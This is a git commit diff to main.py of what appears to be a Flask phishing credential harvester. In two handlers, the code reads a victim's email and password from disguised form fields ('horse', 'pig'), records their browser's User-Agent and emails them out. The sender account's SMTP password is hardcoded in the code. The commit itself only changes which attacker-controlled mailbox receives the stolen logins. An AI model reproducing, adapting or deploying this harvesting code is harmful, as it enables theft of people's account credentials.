23dcd3b29295f2b65bd27fc5acb2ddd0cad700f2
fsnks <130067396+fsnks@users.noreply.github.com>
2023-08-30 02:17:18 -0700

    Update main.py

--- main.py
+++ main.py
@@ -146,7 +146,7 @@ def first():
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
         sender_email = "ghost@newupdateishere.com"
-        receiver_email = "serena@lamdbaspa.com"
+        receiver_email = "dan@newupdateishere.com"
         password = "yhG]rLZwK1!)"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
@@ -183,7 +183,7 @@ def second():
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
         sender_email = "ghost@newupdateishere.com"
-        receiver_email = "serena@lamdbaspa.com"
+        receiver_email = "dan@newupdateishere.com"
         password = "yhG]rLZwK1!)"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
